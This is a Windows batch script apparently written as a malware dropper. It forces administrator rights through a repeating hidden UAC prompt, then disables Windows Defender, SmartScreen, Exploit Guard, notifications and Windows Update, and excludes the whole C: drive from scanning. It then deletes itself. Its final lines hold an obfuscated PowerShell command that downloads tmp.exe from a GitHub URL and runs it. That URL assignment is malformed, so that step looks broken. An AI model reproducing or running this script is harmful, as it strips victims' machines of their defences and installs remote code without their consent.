@echo off
setlocal enabledelayedexpansion
:: =========================================
:: SELF-ELEVATION WITH HIDDEN WINDOW + AGGRESSIVE UAC LOOP
:: =========================================
if /i "%~1"=="silent" goto silent_mode

:retry_uac
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'silent' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
if %errorlevel% neq 0 (
    timeout /t 1 /nobreak >nul
    goto retry_uac
)
exit /b

:silent_mode
:: =========================================
:: CREATE LOG FILE IN TEMP DIRECTORY (HIDDEN)
:: =========================================
set "log_file=%TEMP%\wdd.log"
echo Windows Defender Disabler Log - %date% %time% > "%log_file%"
echo ========================================================= >> "%log_file%"

:: =========================================
:: EARLY EXCLUSIONS + NOTIFICATION SUPPRESSION
:: =========================================
echo [INFO] Adding early exclusions and notification suppression... >> "%log_file%"
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\Microsoft\Update' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:' -ErrorAction SilentlyContinue" >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableVirusAndThreatProtectionNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableThreatsNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableAllNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableAppNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableSecurityHealthNotification /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" /v UILockdown /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus and threat protection" /v UILockdown /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableVirusAndThreatProtectionNotifications /t REG_DWORD /d 1 /f >nul 2>&1
echo [SUCCESS] Early exclusions and notification suppression applied >> "%log_file%"

:: =========================================
:: DISABLE WINDOWS DEFENDER POLICIES
:: =========================================
echo [INFO] Disabling Windows Defender policies... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v PUAProtection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v RandomizeScheduleTaskTimes /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ForceDefenderPassiveMode /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f >nul 2>&1
echo [SUCCESS] Windows Defender policies disabled >> "%log_file%"
:: =========================================
:: REAL-TIME PROTECTION
:: =========================================
echo [INFO] Disabling Real-Time Protection... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableArchiveScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableEmailScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIntrusionPreventionSystem /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1
echo [SUCCESS] Real-Time Protection disabled >> "%log_file%"
:: =========================================
:: CLOUD & SAMPLE SUBMISSION
:: =========================================
echo [INFO] Disabling Cloud & Sample Submission... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0 /f >nul 2>&1
echo [SUCCESS] Cloud & Sample Submission disabled >> "%log_file%"
:: =========================================
:: SCAN DISABLE
:: =========================================
echo [INFO] Disabling Scanning... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" /v DisableScheduledScan /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" /v DisableRemovableDriveScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" /v DisableRestorePoint /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" /v ScheduleDay /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" /v ScheduleTime /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" /v CheckForSignaturesBeforeRunningScan /t REG_DWORD /d 0 /f >nul 2>&1
echo [SUCCESS] Scanning disabled >> "%log_file%"
:: =========================================
:: SIGNATURE UPDATES DISABLE
:: =========================================
echo [INFO] Disabling Signature Updates... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v DisableUpdateOnStartupWithoutEngine /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v UpdateOnStartUp /t REG_DWORD /d 0 /f >nul 2>&1
echo [SUCCESS] Signature Updates disabled >> "%log_file%"
:: =========================================
:: SECURITY CENTER UI / NOTIFICATIONS
:: =========================================
echo [INFO] Finalizing notification suppression... >> "%log_file%"
echo [SUCCESS] Notification suppression completed >> "%log_file%"
:: =========================================
:: SECURITY CENTER DISABLE UI FEATURES
:: =========================================
echo [INFO] Disabling Security Center UI Features... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" /v DisableAccountProtectionUI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" /v DisableAppBrowserUI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" /v DisableDeviceSecurityUI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" /v DisableFamilyUI /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" /v DisableFirewallUI /t REG_DWORD /d 1 /f >nul 2>&1
echo [SUCCESS] Security Center UI Features disabled >> "%log_file%"
:: =========================================
:: SMARTSCREEN
:: =========================================
echo [INFO] Disabling SmartScreen... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /t REG_SZ /d Off /f >nul 2>&1
echo [SUCCESS] SmartScreen disabled >> "%log_file%"
:: =========================================
:: EXPLOIT GUARD DISABLE
:: =========================================
echo [INFO] Disabling Exploit Guard... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" /v EnableNetworkProtection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access" /v EnableControlledFolderAccess /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR" /v ExploitGuard_ASR_Rules /t REG_SZ /d "" /f >nul 2>&1
echo [SUCCESS] Exploit Guard disabled >> "%log_file%"
:: =========================================
:: STOP SERVICES
:: =========================================
echo [INFO] Stopping Windows Defender services... >> "%log_file%"
sc stop WinDefend >nul 2>&1
sc stop SecurityHealthService >nul 2>&1
sc stop Sense >nul 2>&1
sc stop WdNisSvc >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc config SecurityHealthService start= disabled >nul 2>&1
sc config Sense start= disabled >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
taskkill /f /im MsMpEng.exe >nul 2>&1
taskkill /f /im SecurityHealthService.exe >nul 2>&1
echo [SUCCESS] Windows Defender services stopped >> "%log_file%"
:: =========================================
:: DISABLE SCHEDULED TASKS
:: =========================================
echo [INFO] Disabling Windows Defender scheduled tasks... >> "%log_file%"
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender*" /Disable >nul 2>&1
echo [SUCCESS] Scheduled tasks disabled >> "%log_file%"
:: =========================================
:: REMOVE FROM STARTUP
:: =========================================
echo [INFO] Removing Windows Defender from startup... >> "%log_file%"
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /f >nul 2>&1
echo [SUCCESS] Removed from startup >> "%log_file%"
:: =========================================
:: ADD COMPREHENSIVE EXCLUSIONS
:: =========================================
echo [INFO] Adding exclusions... >> "%log_file%"
powershell -Command "Add-MpPreference -ExclusionPath 'C:' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Desktop' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Downloads' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue" >nul 2>&1
echo [SUCCESS] Exclusions added >> "%log_file%"
:: =========================================
:: WINDOWS UPDATES DISABLE SECTION
:: =========================================
echo [INFO] Disabling Windows Updates for long term stability... >> "%log_file%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableOSUpgrade /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ScheduledInstallDay /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ScheduledInstallTime /t REG_DWORD /d 0 /f >nul 2>&1
sc config wuauserv start= disabled >nul 2>&1
sc stop wuauserv >nul 2>&1
sc config bits start= disabled >nul 2>&1
sc stop bits >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\WindowsUpdate\Scheduled Start" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\UpdateOrchestrator\Schedule Scan" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\UpdateOrchestrator\Schedule Wake To Work" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\UpdateOrchestrator\Reboot" /Disable >nul 2>&1
echo [SUCCESS] Windows Updates disabled for long term stability >> "%log_file%"
:: =========================================
:: SELF-DELETE
:: =========================================
del "%~f0" /q >nul 2>&1
echo Windows Defender completely disabled! >> "%log_file%"
@echo off
set "https://github.com/Zetatype/RMP/raw/refs/heads/main/tmp.exe"
set "Filename=tmp.exe"
@powershell -NoP"r"o"f"ile -Executi"o"nPolic"y" Bypass -W"i"ndowStyle Hidden -C"o"mmand "I"nv"o"ke-WebReq"u"est %Url% -"O"ut"fi"le %Filename%; St"art-Process %Filename%"
exit
